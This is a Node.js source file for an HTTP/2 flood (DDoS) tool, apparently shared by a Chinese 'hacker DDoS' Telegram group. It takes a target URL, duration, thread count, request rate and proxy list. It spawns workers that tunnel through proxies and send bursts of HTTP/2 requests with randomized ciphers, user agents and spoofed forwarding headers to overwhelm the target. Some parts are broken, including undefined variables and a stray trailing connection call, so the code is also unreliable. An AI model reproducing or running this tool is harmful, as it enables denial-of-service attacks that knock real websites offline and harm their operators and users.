// 黑客Ddos交流群 @heikeddos 频道 @ddosheike
// 导入所需模块
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const net = require('net');
const request = require('request');
const cluster = require('cluster');
const fakeua = require('fake-useragent');
const randstr = require('randomstring')

// 定义加密套件列表
cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "AES256-SHA256:AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA",
    "AES128-GCM-SHA256:AES128-SHA:DHE-RSA-AES128-SHA",
    "ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305",
    "AES256-GCM-SHA384:AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
]

// 定义各种HTTP请求头
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
]

// 定义语言请求头
lang_header = [
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7',
    'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
    'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
    'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
    'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
]

// 定义编码请求头
encoding_header = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    '*'
]

// 定义缓存控制请求头
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'must-revalidate',
    'public',
    'private',
    'proxy-revalidate',
    's-maxage=86400'
]

// 定义忽略的错误类型和代码
ignoreNames = [
    'RequestError',
    'StatusCodeError',
    'CaptchaError',
    'CloudflareError',
    'ParseError',
    'ParserError',
    'TimeoutError',
    'JSONError',
    'URLError',
    'InvalidURL',
    'ProxyError'
]

ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ECONNRESET',
    'ERR_ASSERTION',
    'ECONNREFUSED',
    'EPIPE',
    'EHOSTUNREACH',
    'ETIMEDOUT',
    'ESOCKETTIMEDOUT',
    'EPROTO',
    'EAI_AGAIN',
    'EHOSTDOWN',
    'ENETRESET',
    'ENETUNREACH',
    'ENONET',
    'ENOTCONN',
    'ENOTFOUND',
    'EAI_NODATA',
    'EAI_NONAME',
    'EADDRNOTAVAIL',
    'EAFNOSUPPORT',
    'EALREADY',
    'EBADF',
    'ECONNABORTED',
    'EDESTADDRREQ',
    'EDQUOT',
    'EFAULT',
    'EHOSTUNREACH',
    'EIDRM',
    'EILSEQ',
    'EINPROGRESS',
    'EINTR',
    'EINVAL',
    'EIO',
    'EISCONN',
    'EMFILE',
    'EMLINK',
    'EMSGSIZE',
    'ENAMETOOLONG',
    'ENETDOWN',
    'ENOBUFS',
    'ENODEV',
    'ENOENT',
    'ENOMEM',
    'ENOPROTOOPT',
    'ENOSPC',
    'ENOSYS',
    'ENOTDIR',
    'ENOTEMPTY',
    'ENOTSOCK',
    'EOPNOTSUPP',
    'EPERM',
    'EPIPE',
    'EPROTONOSUPPORT',
    'ERANGE',
    'EROFS',
    'ESHUTDOWN',
    'ESPIPE',
    'ESRCH',
    'ETIME',
    'ETXTBSY',
    'EXDEV',
    'UNKNOWN',
    'DEPTH_ZERO_SELF_SIGNED_CERT',
    'UNABLE_TO_VERIFY_LEAF_SIGNATURE',
    'CERT_HAS_EXPIRED',
    'CERT_NOT_YET_VALID'
]

// 定义获取随机请求头的函数
const headerFunc = {
    accept() {
        return accept_header[Math.floor(Math.random() * accept_header.length)];
    },
    lang() {
        return lang_header[Math.floor(Math.random() * lang_header.length)];
    },
    encoding() {
        return encoding_header[Math.floor(Math.random() * encoding_header.length)];
    },
    controling() {
        return controle_header[Math.floor(Math.random() * controle_header.length)];
    },
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    }
}

// 生成随机IP地址
function spoof() {
    return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}`;
}

// 生成随机字节
function randomByte() {
    let buffer = new Uint8Array(1);
    window.crypto.getRandomValues(buffer);
    return buffer[0];
}

// 生成随机IP地址
function randomIp() {
    let segments = [];
    for (let i = 0; i < 4; i++) {
        segments.push(Math.floor(Math.random() * 256));
    }
    return segments.join('.');
}

// 处理未捕获的异常和警告
process.on('uncaughtException', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    // console.warn(e);
}).on('unhandledRejection', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).on('warning', e => {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).setMaxListeners(0);

// 检查IP地址是否是私有IP地址
function isPrivate(ip, privateRanges) {
    if (!ip) {
        throw new Error('需要 IP 地址');
    }
    if (!privateRanges || !Array.isArray(privateRanges)) {
        privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
    }
    const ipRange = ipaddr.parse(ip);
    for (let i = 0; i < privateRanges.length; i++) {
        const range = ipaddr.parseCIDR(privateRanges[i]);
        if (ipRange.match(range)) {
            return true;
        }
    }
    return false;
}

// 获取命令行参数
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const rps = process.argv[5];
const proxyFile = process.argv[6];

// 验证是否提供参数
if (!target || !time || !thread || !proxyFile || !rps) {
    console.error('请提供以下参数：');
    console.error('  目标：要攻击的目标URL');
    console.error('  时间：攻击持续时间（以秒为单位）');
    console.error('  线程：用于攻击的线程数');
    console.error('  请求：每秒发送的最大请求数 最大512');
    console.error('  代理：用于攻击的代理列表的文件路径');
    console.error(`示例: node ${process.argv[1]} http://example.com/ 60 10 proxy.txt 100`);
    process.exit(1);
}

// 验证目标格式
if (!/^https?:\/\//i.test(target)) {
    console.error('目标协议为 http:// or https://');
    process.exit(1);
}

// 解析代理列表
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    console.error('读取代理文件时出错：', err.message);
    process.exit(1);
}

// 验证RPS值
if (isNaN(rps) || rps <= 0) {
    console.error('Rps 必须是正数');
    process.exit(1);
}

// 获取随机代理
const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

// 如果是主进程
if (cluster.isMaster) {
    const currentDate = new Date();
    console.log(`Attack sent successfully! | 目标：${target} | 时间：${time}s | 线程：${thread} | 请求：${rps}`);

    for (let _ of Array.from({length: thread})) {
        cluster.fork();
    }
    setTimeout(() => process.exit(-1), time * 1000);

} else {
    // 洪水攻击函数
    function flood() {
        var parsed = url.parse(target);
        const uas = fakeua();
        var cipper = headerFunc.cipher();
        var proxy = proxyr().split(':');
        var cookie = request.jar();
        var randIp = randomIp();

        var header = {
            ":method": "GET",
            ":authority": parsed.host,
            ":path": parsed.path,
            ":scheme": "https",
            "X-Forwarded-For": randIp,
            "user-agent": uas,
            "Origin": target,
            "accept": headerFunc.accept(),
            "accept-encoding": headerFunc.encoding(),
            "accept-language": headerFunc.lang(),
            "referer": target,
            "Upgrade-Insecure-Requests": "1",
            "cache-control": "max-age=0"
        }

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: 100
        });

        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/80.0.361.62 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0',
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0',
                'User-Agent': 'Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
                'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'Referer': 'https://google.com',
                'DNT': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Charset': 'utf-8;q=0.7,*;q=0.7',
                'Keep-Alive': 'timeout=5, max=512',
                'Expect': '100-continue',
                'X-Requested-With': 'XMLHttpRequest'
            },
            method: 'CONNECT',
            path: parsed.host + ':443',
            keepAlive: true,
            keepAliveMsecs: 50000
        }, (res) => {
            // 处理响应
        });

        req.on('connect', function (res, socket, head) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                ciphers: cipper,
                port: 443,
                servername: parsed.host,
                echdCurve: "GREASE:X25519:x25519",
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
                sessionTimeout: 5000,
                socket: socket
            }, () => {
                const client = http2.connect(parsed.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 5000,
                        initialWindowSize: 1048576 * 10,
                        maxHeaderListSize: 65536 * 10,
                        enablePush: true
                    }
                }, function (session) {
                    for (let i = 0; i < rps; i++) {
                        const req = session.request(header);
                        req.setEncoding('utf8');

                        req.on('data', (chunk) => {
                            // data += chunk;
                        });
                        req.on("response", (res) => {
                            req.close();
                        });
                        req.end().on('error', () => {});
                    }
                });
            });
        });

        req.end();
    }

    // 设置定时器，定时调用flood函数
    setInterval(() => {
        flood();
    });
}

const client = http2.connect(parsed.href, clientOptions, function() {
    // 处理成功后的连接
});
